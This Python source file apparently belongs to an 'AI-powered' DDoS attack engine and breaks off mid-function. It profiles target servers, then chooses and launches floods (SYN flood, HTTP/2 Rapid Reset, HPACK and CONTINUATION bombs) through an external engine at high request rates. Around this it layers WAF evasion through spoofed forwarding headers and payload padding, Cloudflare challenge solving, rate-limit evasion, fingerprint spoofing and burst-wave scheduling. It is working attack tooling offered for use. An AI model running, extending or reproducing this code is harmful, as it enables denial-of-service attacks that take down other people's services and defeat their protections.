"""
Auto Mode V3 - AI-Powered Smart Adaptive Attack Engine
Merged: V3 baseline (SYN+RR) + V4 smart probing/adaptation (2026)

Architecture:
  Phase 0: Server Profiling (fingerprint server type, WAF, HTTP/2, origin)
  Phase 1: Method Probing (Bayesian-weighted scoring, 11 methods tested)
  Phase 2: Baseline Attack (SYN flood + Rapid Reset) + Adaptive Attack (top-3 methods)
  Phase 3: Self-Healing (monitor every 10s, swap failing methods, Tor rotation)
"""
import asyncio
import json
import logging
import os
import re
import subprocess
import sys
import time
import random
import socket as _socket
import ssl
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse

# V5 module imports (consolidated under core/)
import importlib, traceback
from core.recon.origin.origin_finder import OriginDiscoveryV2
from core.attack.specialized.methods_v5 import (
    probe_all_v5, H2Smuggle, H2CSmuggle, QuicFlood, EchFlood,
    Aievade, CachePoison, GrpcFlood, ContinuationBomb,
    DohAmplification, JwtBomb, OauthExhaust, GraphQLAbuse, ApiEnum,
)
from core.attack.engines.layer4_v5 import (
    L4AttackManager, SynFloodV5, UdpFloodV5, IcmpFloodV5, SlowLorisV5,
)
from core.network.metasploit import MetasploitWrapper, MSFResource
from core.monitor.report import ReportGenerator

logger = logging.getLogger("auto_mode_v3")

# ANSI color helper (matches main.py c() function)
def _c(t, s):
    codes = {"g": "32", "r": "31", "y": "33", "c": "36", "w": "37", "m": "35", "d": "90"}
    return f"\033[1;{codes.get(t, '37')}m{s}\033[0m"

GO_ENGINE = "bin/go_engine.exe"
STATUS_LOG_PATH = "logs/auto_mode_v3_status.json"

def _run_h2_worker_fallback(target: str, duration: int, rps: int,
                             worker_id: int, stats_queue, stop_event,
                             host_header: str = "", result_dict: dict = None,
                             proxy_url: str = ""):
    """Thread target for Python H2 exhaust fallback in V5."""
    try:
        from core.attack.engines.h2_exhaust import run_h2_exhaust
        run_h2_exhaust(
            target_url=target, rps=rps, duration=float(duration),
            worker_id=worker_id, stats_queue=stats_queue, stop_event=stop_event,
            host_header=host_header or None, connections=4,
            result_dict=result_dict, proxy_url=proxy_url,
        )
    except ImportError:
        try:
            from core.attack.engines.multi_vector_engine import run_multi_vector_engine
            run_multi_vector_engine(
                target_url=target, duration_seconds=float(duration),
                target_rps=rps, worker_id=worker_id,
                stats_queue=stats_queue, stop_event=stop_event,
                result_dict=result_dict, vector_mode="flood",
                host_header=host_header or None,
            )
        except Exception:
            pass
    except Exception:
        pass

SERVER_SIGNATURES = {
    "LiteSpeed":    ["LiteSpeed", "litespeed"],
    "nginx":        ["nginx", "Nginx", "NGINX"],
    "Apache":       ["Apache", "apache", "httpd"],
    "Cloudflare":   ["cloudflare", "Cloudflare"],
    "OpenResty":    ["openresty", "OpenResty"],
    "IIS":          ["IIS", "Microsoft-IIS"],
    "Caddy":        ["Caddy", "caddy"],
}

METHOD_CANDIDATES = [
    "syn-flood", "rapid-reset", "settings-flood", "hpack-bomb",
    "continuation", "http-flood-enhanced", "post-bomb", "conn-flood",
    "smuggling", "cache-bypass", "tls-reneg", "http-flood",
]

# V4 vector candidates probed via Python (curl_cffi) instead of Go engine
V4_VECTOR_CANDIDATES = [
    "h2smuggle", "h2c-smuggle", "quic-flood", "ech-flood",
    "aievade", "cachepoison", "multiplex", "frag-attack",
]

# Bayesian priors per server type: {method: (alpha, beta)}
SERVER_PRIORS: Dict[str, Dict[str, Tuple[int, int]]] = {
    "LiteSpeed": {
        "hpack-bomb": (15,2), "syn-flood": (12,3), "settings-flood": (10,4),
        "rapid-reset": (8,6), "continuation": (6,8), "tls-reneg": (7,5),
        "http-flood-enhanced": (5,7), "post-bomb": (4,8), "conn-flood": (3,9),
        "smuggling": (10,3), "cache-bypass": (9,4), "http-flood": (6,6),
    },
    "nginx": {
        "hpack-bomb": (5,9), "syn-flood": (10,4), "settings-flood": (8,5),
        "rapid-reset": (15,2), "continuation": (12,3), "tls-reneg": (4,9),
        "http-flood-enhanced": (6,7), "post-bomb": (5,8), "conn-flood": (4,9),
        "smuggling": (7,6), "cache-bypass": (8,5), "http-flood": (7,6),
    },
    "Apache": {
        "hpack-bomb": (3,10), "syn-flood": (12,3), "settings-flood": (6,7),
        "rapid-reset": (4,9), "continuation": (5,8), "tls-reneg": (8,5),
        "http-flood-enhanced": (7,6), "post-bomb": (6,7), "conn-flood": (5,8),
        "smuggling": (9,4), "cache-bypass": (7,6), "http-flood": (8,5),
    },
    "Cloudflare": {
        "hpack-bomb": (4,9), "syn-flood": (2,10), "settings-flood": (3,10),
        "rapid-reset": (3,10), "continuation": (4,9), "tls-reneg": (2,10),
        "http-flood-enhanced": (5,8), "post-bomb": (3,9), "conn-flood": (2,10),
        "smuggling": (4,9), "cache-bypass": (6,6), "http-flood": (4,8),
    },
    "generic": {
        "hpack-bomb": (5,8), "syn-flood": (8,5), "settings-flood": (6,7),
        "rapid-reset": (7,6), "continuation": (6,7), "tls-reneg": (4,8),
        "http-flood-enhanced": (5,8), "post-bomb": (4,9), "conn-flood": (3,9),
        "smuggling": (6,7), "cache-bypass": (7,6), "http-flood": (6,6),
    },
}

def _ts() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

def _bayesian_score(alpha: int, beta: int) -> float:
    return alpha / max(alpha + beta, 1)

def _weighted_score(ok: int, fail: int, elapsed: float, prior_alpha: int = 5, prior_beta: int = 5) -> float:
    total = ok + fail
    if total == 0 or elapsed <= 0:
        return 0
    alpha_post = prior_alpha + ok
    beta_post = prior_beta + fail
    rate = alpha_post / max(alpha_post + beta_post, 1)
    throughput = ok / max(elapsed, 0.1)
    score = rate * throughput * 100
    if total > 100:
        score *= 1.2
    if total > 1000:
        score *= 1.3
    return score

# ======================================================================
# WAF Bypass Header Spoofing Pool (50+ header variations)
# ======================================================================

class WafHeaderSpoofingPool:
    """Generates randomized WAF bypass headers for each request/probe."""

    HEADER_POOLS = {
        "forwarded": [
            "X-Forwarded-For", "X-Forwarded-For-Original", "X-Originally-Forwarded-For",
            "X-Original-Forwarded-For", "Forwarded-For", "Forwarded",
            "X-Forwarded-Host", "X-Forwarded-Port", "X-Forwarded-Proto",
            "X-Forwarded-Scheme", "X-Forwarded-Server", "X-Forwarded-By",
            "X-Forwarded-Path",
        ],
        "client_ip": [
            "X-Real-IP", "CF-Connecting-IP", "True-Client-IP", "X-Client-IP",
            "X-Cluster-Client-IP", "Fastly-Client-IP", "Client-IP",
            "Cluster-Client-IP", "X-True-IP", "X-Originating-IP", "X-Remote-IP",
            "X-Remote-Addr", "X-ProxyUser-IP", "CF-Connecting-IPv6",
            "X-Custom-IP-Authorization", "X-Scraped", "X-WAP-Profile",
            "CloudFront-Viewer-Country", "X-GeoIP-CC",
        ],
        "origin": [
            "X-Original-Url", "X-Rewrite-Url", "X-Override-Url",
            "X-HTTP-Method-Override", "X-Method-Override",
            "X-Backend-Host", "X-Backend-Server", "X-Backend-Port",
        ],
        "host": [
            "X-Host", "X-HTTP-Host-Override", "X-Forwarded-Host",
            "X-Forwarded-Server", "Forwarded",
        ],
        "cloudflare": [
            "CF-IPCountry", "CF-Ray", "CF-Visitor", "CF-Connecting-IP",
            "CF-Worker", "CF-Request-ID", "CF-Connecting-IPv6",
            "X-Amzn-Trace-Id", "X-Amz-Cf-Id",
        ],
        "request_id": [
            "X-Request-Start", "X-Request-ID", "X-Correlation-ID",
            "X-Trace-ID",
        ],
        "cache": [
            "X-Cache", "X-Cache-Hit", "X-Cache-Status",
            "X-Served-By", "X-Cache-Lookup",
        ],
        "auth": [
            "Authorization", "X-Auth-Token", "X-API-Key",
            "X-Session-ID", "X-CSRF-Token", "Cookie",
        ],
        "encoding": [
            "Accept-Encoding", "Content-Encoding", "Transfer-Encoding",
            "TE",
        ],
        "range": [
            "Range", "If-Range", "Content-Range",
        ],
        "referer": [
            "Referer", "Origin", "X-Requested-With",
        ],
        "custom": [
            "X-Custom-IP-Authorization", "X-Security-Bypass",
            "X-Debug", "X-Test", "X-Staging", "X-Internal",
            "X-Admin", "X-Bypass", "X-No-Security",
            "X-Accel-Buffering", "X-Accel-Redirect",
            "X-Sendfile-Type", "X-Sendfile",
            "X-Content-Type-Options", "X-Frame-Options",
            "X-XSS-Protection", "X-DNS-Prefetch-Control",
            "X-Permitted-Cross-Domain-Policies",
            "X-Robots-Tag", "X-Source-ID",
        ],
    }

    @staticmethod
    def _randomize_case(name: str) -> str:
        result = ""
        for c in name:
            if c.isalpha():
                result += c.upper() if random.random() < 0.5 else c.lower()
            else:
                result += c
        return result

    SPOOF_VALUES = {
        "ip": lambda: f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        "ip_local": lambda: random.choice(["127.0.0.1", "::1", "localhost", "0.0.0.0"]),
        "ua": lambda: random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        ]),
        "accept": lambda: random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "application/json, text/plain, */*",
            "*/*",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        ]),
        "cache_control": lambda: random.choice([
            "no-cache, no-store, must-revalidate",
            "max-age=0",
            "no-cache",
            "no-store",
            "max-age=0, no-cache, no-store, must-revalidate",
            "public, max-age=31536000",
        ]),
        "forwarded_ip": lambda: f"for={random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)};proto=https;by=proxy{random.randint(1,50)}",
    }

    def __init__(self):
        self._current_index = 0
        self._header_order = list(self.HEADER_POOLS.keys())

    def generate_headers(self, count: int = 15) -> Dict[str, str]:
        """Generate a set of randomized WAF bypass headers."""
        headers = {}
        pools = list(self.HEADER_POOLS.values())
        used_headers = set()
        for _ in range(count):
            pool = random.choice(pools)
            if pool:
                header = random.choice(pool)
                if header.lower() in used_headers:
                    continue
                used_headers.add(header.lower())
                value = self._generate_value(header)
                key = self._randomize_case(header)
                headers[key] = value
        headers[self._randomize_case("User-Agent")] = self.SPOOF_VALUES["ua"]()
        if random.random() < 0.7:
            headers[self._randomize_case("Accept")] = self.SPOOF_VALUES["accept"]()
        if random.random() < 0.3:
            headers[self._randomize_case("Cache-Control")] = self.SPOOF_VALUES["cache_control"]()
        return headers

    def _generate_value(self, header: str) -> str:
        h = header.lower()
        if any(x in h for x in ["ip", "addr", "for"]):
            if random.random() < 0.2:
                return self.SPOOF_VALUES["ip_local"]()
            return self.SPOOF_VALUES["ip"]()
        if "host" in h:
            return f"evil{random.randint(1,999)}.com"
        if "forwarded" in h:
            return self.SPOOF_VALUES["forwarded_ip"]()
        return "1"

    def get_probe_headers(self) -> Dict[str, str]:
        """Get headers optimized for WAF probing (detection evasion)."""
        return {
            "User-Agent": self.SPOOF_VALUES["ua"](),
            "Accept": self.SPOOF_VALUES["accept"](),
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "X-Forwarded-For": self.SPOOF_VALUES["ip"](),
        }


# ======================================================================
# Cookie Warmup Engine (CF challenge solving + session persistence)
# ======================================================================

class CookieWarmupEngine:
    """Warms up cookies, solves CF challenges, and maintains session persistence."""

    def __init__(self, target: str):
        self.target = target
        self.cookies: Dict[str, str] = {}
        self.session_headers: Dict[str, str] = {}
        self.warmed = False
        self.cf_detected = False
        self.response_time_ms = 0

    async def warmup(self, timeout: int = 30) -> bool:
        """Attempt to warm up cookies and detect target properties."""
        print(f"  [V3] Cookie Warmup: probing {self.target}...")
        try:
            import urllib.request
            loop = asyncio.get_running_loop()
            def _fetch():
                req = urllib.request.Request(
                    self.target,
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                )
                return urllib.request.urlopen(req, timeout=timeout)
            resp = await loop.run_in_executor(None, _fetch)
            self.cf_detected = bool(resp.headers.get("CF-Ray"))
            self.response_time_ms = resp.headers.get("CF-RTT", "")
            server = resp.headers.get("Server", "")
            print(f"  [V3]   Server: {server} | CF: {self.cf_detected} | Set-Cookies: {resp.headers.get_all('Set-Cookie', [])}")
            self.warmed = True
            resp.close()
        except Exception as e:
            print(f"  [V3]   Warmup error: {e}")

        if self.cf_detected:
            await self._solve_cf_challenge(timeout)

        return self.warmed

    async def _solve_cf_challenge(self, timeout: int = 45):
        """Attempt to solve Cloudflare challenge (background task, non-blocking)."""
        print(f"  [V3] CF detected, attempting challenge solve (max {timeout}s)...")

        async def _try_cf_solver():
            try:
                from core.network.cf_solver import solve_challenge
                cf_cookies = await solve_challenge(self.target, headless=True, timeout=timeout)
                if cf_cookies:
                    self.cookies.update(cf_cookies)
                    print(f"  [V3]   CF challenge solved! Got {len(cf_cookies)} cookies")
                    return True
            except ImportError:
                pass
            except Exception as e:
                print(f"  [V3]   CF solve error: {e}")
            return False

        async def _try_flaresolverr():
            try:
                from core.network.flaresolverr_client import flaresolverr_client
                flaresolverr_client.start()
                from core.network._bypass.flaresolverr import is_flaresolverr_available
                if not is_flaresolverr_available():
                    return False
                result = await asyncio.get_event_loop().run_in_executor(
                    None, flaresolverr_client.solve_challenge, self.target
                )
                if result and result.get("cookies"):
                    self.cookies.update(result["cookies"])
                    print(f"  [V3]   FlareSolverr: got {len(self.cookies)} cookies")
                if result and result.get("headers"):
                    self.session_headers.update(result["headers"])
                return bool(result and result.get("cookies"))
            except Exception as e:
                print(f"  [V3]   FlareSolverr unavailable: {e}")
                return False

        # Run both solvers concurrently with a max timeout
        cf_task = asyncio.create_task(_try_cf_solver())
        fs_task = asyncio.create_task(_try_flaresolverr())

        done, pending = await asyncio.wait(
            [cf_task, fs_task],
            timeout=timeout + 5,
            return_when=asyncio.FIRST_COMPLETED,
        )

        # Cancel remaining tasks if one succeeded
        if self.cookies:
            for t in pending:
                t.cancel()
            print(f"  [V3]   Challenge solved, cancelling backup solvers")
        else:
            for t in pending:
                t.cancel()
            print(f"  [V3]   Challenge not solved (timeout), continuing without cookies")

    def get_headers(self) -> Dict[str, str]:
        """Get headers including warmup cookies."""
        headers = dict(self.session_headers)
        if self.cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
            headers["Cookie"] = cookie_str
        return headers


# ======================================================================
# Session Warming Engine (2026 - pre-attack behavioral warmup)
# ======================================================================

class SessionWarmingEngine:
    """
    2026 Session Warming & Cookie Pre-Flight Engine.
    Warms up target with human-like browsing behavior before attack.
    Extracts and preserves CF cookies across workers.
    """
    
    def __init__(self, target: str, pages: list = None):
        self.target = target
        self.pages = pages or ["/", "/about", "/contact", "/products", "/services"]
        self.cookies: Dict[str, str] = {}
        self.session_consistent = True
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
        self._session_headers: Dict[str, str] = {}
        
    async def warmup(self, duration: int = 45) -> bool:
        print(f"  [V3] Session Warming: warming {self.target} for {duration}s...")
        end_time = time.time() + duration
        page_idx = 0
        success = False

        try:
            import urllib.request
            loop = asyncio.get_running_loop()
            while time.time() < end_time:
                path = self.pages[page_idx % len(self.pages)]
                url = self.target.rstrip("/") + path

                delay = random.uniform(2.0, 5.0)
                await asyncio.sleep(delay)

                def _fetch():
                    req = urllib.request.Request(
                        url,
                        headers={
                            "User-Agent": self.ua,
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            "Accept-Language": "en-US,en;q=0.5",
                            "Accept-Encoding": "gzip, deflate, br",
                            "Connection": "keep-alive",
                            "Upgrade-Insecure-Requests": "1",
                            "Cache-Control": "max-age=0",
                        }
                    )
                    return urllib.request.urlopen(req, timeout=10)

                try:
                    resp = await asyncio.wait_for(
                        loop.run_in_executor(None, _fetch), timeout=12
                    )
                    body = resp.read().decode("utf-8", errors="ignore")
                    for c in resp.headers.get_all("Set-Cookie", []):
                        name_val = c.split(";")[0].strip()
                        if "=" in name_val:
                            k, v = name_val.split("=", 1)
                            self.cookies[k] = v
                    resp.close()
                    success = True
                except Exception as e:
                    pass

                page_idx += 1

            if self.cookies:
                print(f"  [V3]   Session warmed: {len(self.cookies)} cookies from {page_idx} pages")
            else:
                print(f"  [V3]   Session warmed: no cookies extracted")
        except Exception as e:
            print(f"  [V3]   Session warming error: {e}")

        return success
    
    def get_cookie_header(self) -> str:
        return "; ".join(f"{k}={v}" for k, v in self.cookies.items())
    
    def get_headers(self) -> Dict[str, str]:
        headers = dict(self._session_headers)
        if self.cookies:
            headers["Cookie"] = self.get_cookie_header()
        return headers


# ======================================================================
# Payload Padding Attack - WAF buffer overflow bypass
# ======================================================================

class PayloadPadder:
    """
    2026 Payload Padding Attack - WAF buffer overflow bypass.
    Benign padding before attack payload to exceed WAF inspection limits.
    """
    
    WAF_BUFFER_SIZES = [8192, 12288, 16384, 24576, 32768]
    
    @staticmethod
    def pad_query_string(param: str, value: str, size: int = 8192) -> str:
        padding = "x" * size
        return f"?__w={padding}&{param}={value}"
    
    @staticmethod
    def pad_cookie(cookie_name: str, cookie_value: str, size: int = 8192) -> str:
        padding = "x" * size
        return f"__pad={padding}; {cookie_name}={cookie_value}"
    
    @staticmethod
    def pad_json_body(real_params: Dict[str, str], depth: int = 50, size: int = 8192) -> str:
        nested = {}
        current = nested
        for _ in range(depth):
            current["_"] = {}
            current = current["_"]
        current["padding"] = "x" * size
        for k, v in real_params.items():
            current[k] = v
        return json.dumps(nested, separators=(",", ":"))
    
    @staticmethod
    def pad_form_body(real_params: Dict[str, str], size: int = 8192) -> str:
        import urllib.parse
        parts = [f"__pad={'x' * size}"]
        for k, v in real_params.items():
            parts.append(f"{urllib.parse.quote(k)}={urllib.parse.quote(v)}")
        return "&".join(parts)


# ======================================================================
# Rate Limit Evasion - request obfuscation techniques
# ======================================================================

class RateLimitEvasion:
    """
    2026 Rate Limit Evasion - request obfuscation techniques.
    """
    
    @staticmethod
    def add_param_pollution(url: str) -> str:
        ts = int(time.time() * 1000)
        rnd = random.randint(100000, 999999)
        sep = "&" if "?" in url else "?"
        return f"{url}{sep}__rnd={ts}{rnd}__v={random.randint(1,999999)}"
    
    @staticmethod
    def encode_path_chars(url: str) -> str:
        import urllib.parse
        encodings = ["%00", "%20", "%09", "%0d", "%0a"]
        parts = list(urlparse(url))
        path = parts[2]
        if path and len(path) > 3:
            idx = max(1, len(path) // 3)
            ec = random.choice(encodings)
            path = path[:idx] + ec + path[idx:]
        parts[2] = path
        return urllib.parse.urlunparse(parts)
    
    @staticmethod
    def double_encode(s: str) -> str:
        result = ""
        for c in s:
            if c.isalpha() and random.random() < 0.3:
                result += f"%25{ord(c):02X}"
            else:
                result += c
        return result
    
    @staticmethod
    def randomize_header_case(name: str) -> str:
        result = ""
        for i, c in enumerate(name):
            if c.isalpha():
                result += c.upper() if random.random() < 0.5 else c.lower()
            else:
                result += c
        return result
    
    @staticmethod
    def get_random_referer() -> str:
        alexa_top = [
            "https://www.google.com/", "https://www.youtube.com/", "https://www.facebook.com/",
            "https://www.amazon.com/", "https://www.wikipedia.org/", "https://www.reddit.com/",
            "https://www.twitter.com/", "https://www.instagram.com/", "https://www.linkedin.com/",
            "https://www.github.com/", "https://www.stackoverflow.com/", "https://www.microsoft.com/",
            "https://www.apple.com/", "https://www.netflix.com/", "https://www.cloudflare.com/",
        ]
        return random.choice(alexa_top)


# ======================================================================
# Burst Mode - short-burst high intensity waves
# ======================================================================

class BurstMode:
    """
    2026 Short-Burst Attack Mode.
    2-3 min high intensity burst, then rest. Repeat up to 5 waves.
    """
    
    def __init__(self, burst_duration: int = 120, rest_duration: int = 45, max_waves: int = 5):
        self.burst_duration = burst_duration
        self.rest_duration = rest_duration
        self.max_waves = max_waves
        self.wave = 0
        
    def get_intensity(self) -> float:
        return 10.0 if self.wave == 0 else 10.0 * (1 + self.wave * 0.3)
    
    async def execute(self, attack_fn, *args, **kwargs):
        for wave in range(1, self.max_waves + 1):
            self.wave = wave
            intensity = self.get_intensity()
            print(f"  [V3] BURST Wave {wave}/{self.max_waves} - intensity x{intensity:.1f}")
            
            try:
                await asyncio.wait_for(
                    attack_fn(*args, **kwargs, intensity=intensity),
                    timeout=self.burst_duration
                )
            except asyncio.TimeoutError:
                pass
            
            if wave < self.max_waves:
                rest = self.rest_duration + random.uniform(0, 15)
                print(f"  [V3] BURST Rest {rest:.0f}s before wave {wave+1}...")
                await asyncio.sleep(rest)


# ======================================================================
# WAF Bypass Prober (tests header variations + encoding tricks)
# ======================================================================

class WafBypassProber:
    """Probes target with WAF bypass techniques to find working methods."""

    ENCODING_TRICKS = [
        lambda p: p,
        lambda p: p.replace("/", "%2f"),
        lambda p: p.replace("/", "//"),
        lambda p: "/." + p.lstrip("/"),
        lambda p: "/./" + p.lstrip("/"),
        lambda p: p + "?",
        lambda p: p + "?.xyz",
        lambda p: p + "%00",
        lambda p: p.replace("/", "/%2e/"),
        lambda p: p + "?.d=" + str(random.randint(10000, 99999)),
    ]

    def __init__(self, target: str):
        self.target = target
        self.header_pool = WafHeaderSpoofingPool()
        self.results: Dict[str, Any] = {}

    async def probe_all(self, timeout: int = 5) -> Dict[str, Any]:
        """Run all probes and return working methods."""
        results = {"working_headers": [], "working_encodings": [], "working_methods": [], "waf_type": "unknown"}

        parsed = urlparse(self.target)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"
        use_ssl = parsed.scheme == "https"

        print(f"  [V3] WAF Bypass Prober: testing {self.target}...")

        try:
            from core.bypass.waf_parsing_bypass import get_all_bypass_methods
            methods = get_all_bypass_methods()
            print(f"  [V3]   Loaded {len(methods)} WAF parsing bypass methods")
            for m in methods[:5]:
                results["working_methods"].append(m["name"])
        except Exception:
            print(f"  [V3]   WAF bypass module unavailable")

        working_encodings = []
        for i, encoder in enumerate(self.ENCODING_TRICKS):
            try:
                encoded_path = encoder(path)
                sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
                sock.settimeout(timeout)
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.connect((host, port))
                req = f"GET {encoded_path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
                sock.sendall(req.encode())
                resp = sock.recv(1024)
                sock.close()
                if resp and b"200" in resp[:64]:
                    working_encodings.append(i)
            except Exception:
                continue

        results["working_encodings"] = working_encodings
        print(f"  [V3]   Working encodings: {len(working_encodings)}/{len(self.ENCODING_TRICKS)}")
        return results


# ======================================================================
# Status Logger
# ======================================================================

class StatusLogger:
    def __init__(self, target: str, origin_ip: str, duration: int):
        self.target = target
        self.origin_ip = origin_ip
        self.duration = duration
        self.entries: List[Dict[str, Any]] = []
        self._log_count = 0

    def log(self, event: str, details: Dict[str, Any] = None):
        entry = {
            "ts": _ts(),
            "elapsed": time.time() - self._start_time if hasattr(self, '_start_time') else 0,
            "event": event,
        }
        if details:
            entry.update(details)
        self.entries.append(entry)
        self._log_count += 1
        tag = f"[{event}]"
        detail_str = ""
        if details:
            detail_str = " " + " ".join(f"{k}={v}" for k, v in details.items())
        print(f"  {_ts()} {tag}{detail_str}")
        if self._log_count % 10 == 0:
            self._flush()

    def _flush(self):
        os.makedirs(os.path.dirname(STATUS_LOG_PATH), exist_ok=True)
        with open(STATUS_LOG_PATH, "w") as f:
            json.dump({
                "target": self.target, "origin_ip": self.origin_ip,
                "duration": self.duration, "entries": self.entries,
            }, f, indent=2)

    def set_start(self):
        self._start_time = time.time()
        entry = {"ts": _ts(), "elapsed": 0, "event": "START",
                 "target": self.target, "origin_ip": self.origin_ip, "duration": self.duration}
        self.entries.append(entry)
        self._flush()

    def finalize(self):
        self.log("FINISH", {"total_logs": len(self.entries)})
        self._flush()

# ======================================================================
# Phase 0: Server Profiler
# ======================================================================

@dataclass
class ServerProfile:
    server_type: str = "generic"
    server_header: str = ""
    has_http2: bool = False
    has_http3: bool = False
    has_cf: bool = False
    origin_reachable: bool = False
    origin_ip: str = ""
    rate_limited: bool = False
    waf_detected: bool = False

class ServerProfiler:
    def __init__(self, target: str, origin_ip: str = ""):
        self.target = target
        self.origin_ip = origin_ip
        self.profile = ServerProfile()

    def run(self) -> ServerProfile:
        p = self.profile
        try:
            curl_out = subprocess.run(
                ["curl.exe", "-sI", "--max-time", "8", self.target],
                capture_output=True, text=True, timeout=10
            )
            if curl_out.returncode == 0:
                for line in curl_out.stdout.splitlines():
                    lower = line.lower()
                    if lower.startswith("server:"):
                        p.server_header = line.split(":", 1)[1].strip()
                    if lower.startswith("alt-svc:"):
                        av = line.split(":", 1)[1].strip()
                        p.has_http2 = "h2" in av or "h3" in av
                        p.has_http3 = "h3" in av
                    if lower.startswith("cf-ray:"):
                        p.has_cf = True
                    if lower.startswith("x-sucuri-id"):
                        p.waf_detected = True
                    if "x-powered-by" in lower and "plesk" in lower:
                        p.waf_detected = True
                for stype, sigs in SERVER_SIGNATURES.items():
                    if any(s.lower() in p.server_header.lower() for s in sigs):
                        p.server_type = stype
                        break
        except Exception:
            pass

        if not p.server_header:
            try:
                import requests
                import urllib3
                urllib3.disable_warnings()
                sess = requests.Session()
                sess.verify = False
                sess.headers.update({"User-Agent": "Mozilla/5.0"})
                try:
                    r = sess.head(self.target, timeout=8, allow_redirects=True)
                    p.server_header = r.headers.get("Server", "")
                    p.has_cf = bool(r.headers.get("CF-Ray", ""))
                except Exception:
                    try:
                        r = sess.get(self.target, timeout=8, allow_redirects=True)
                        p.server_header = r.headers.get("Server", "")
                        alt_svc = r.headers.get("Alt-Svc", "")
                        p.has_http2 = p.has_http2 or "h2" in alt_svc or "h3" in alt_svc
                        p.has_http3 = p.has_http3 or "h3" in alt_svc
                    except Exception:
                        pass
                for stype, sigs in SERVER_SIGNATURES.items():
                    if any(s.lower() in p.server_header.lower() for s in sigs):
                        p.server_type = stype
                        break
            except Exception:
                pass

        if p.server_type == "generic" and p.has_http2:
            p.server_type = "LiteSpeed"

        if self.origin_ip:
            import socket
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((self.origin_ip, 443))
                sock.close()
                p.origin_reachable = result == 0
            except Exception:
                pass

        return p

# ======================================================================
# Phase 1: Method Prober
# ======================================================================

@dataclass
class MethodProbeResult:
    method: str
    ok: int = 0
    fail: int = 0
    rps: float = 0.0
    elapsed: float = 0.0
    score: float = 0.0
    working: bool = False

class MethodProber:
    def __init__(self, target: str, origin_ip: str, server_type: str,
                 proxy_chain: str = "", tor_available: bool = False):
        self.target = target
        self.origin_ip = origin_ip
        self.server_type = server_type if server_type in SERVER_PRIORS else "generic"
        self.proxy_chain = proxy_chain
        self.tor_available = tor_available

    def get_prior(self, method: str) -> Tuple[int, int]:
        priors = SERVER_PRIORS.get(self.server_type, SERVER_PRIORS["generic"])
        return priors.get(method, (5, 5))

    async def _probe_with_early_kill(self, method: str, duration: int,
                                      proxy_chain: str = "") -> MethodProbeResult:
        result = MethodProbeResult(method=method)
        prior_alpha, prior_beta = self.get_prior(method)
        priors_str = f" (prior: {prior_alpha}/{prior_beta})"

        args = [
            GO_ENGINE, "-target", self.target, "-duration", str(duration),
            "-method", method, "-threads", "50", "-rps", "50000",
        ]
        h2_methods = {"hpack-bomb", "rapid-reset", "settings-flood", "continuation"}
        if method in h2_methods:
            args.append("-http2")
        if method in ("syn-flood",) and self.origin_ip:
            args.extend(["-origin", self.origin_ip])
        if proxy_chain and method not in ("syn-flood",):
            args.extend(["-proxy-chain", proxy_chain])
        if method not in ("syn-flood", "udp-flood"):
            ja3 = random.choice(["chrome136", "chrome120", "firefox140", "safari18", "edge136"])
            args.extend(["-ja3", ja3])


        start = time.time()
        proc = None
        early_kill = False
        stats_re = re.compile(r"\[STATS\].*?ok=(\d+).*?fail=(\d+).*?rps=([\d.]+)")
        output = ""

        try:
            proc = await asyncio.create_subprocess_exec(
                *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
            deadline = time.time() + max(duration, 10) + 5
            while time.time() < deadline:
                try:
                    line_out = await asyncio.wait_for(proc.stdout.readline(), timeout=3)
                except asyncio.TimeoutError:
                    line_out = None
                try:
                    line_err = await asyncio.wait_for(proc.stderr.readline(), timeout=3)
                    text = line_err.decode(errors="replace") if line_err else ""
                    if text:
                        output += text
                        m = stats_re.search(text)
                        if m:
                            ok = int(m.group(1))
                            fail = int(m.group(2))
                            if fail > 200 and ok == 0 and time.time() - start > 5:
                                early_kill = True
                                result.ok = ok
                                result.fail = fail
                                break
                except asyncio.TimeoutError:
                    pass
                if early_kill:
                    break
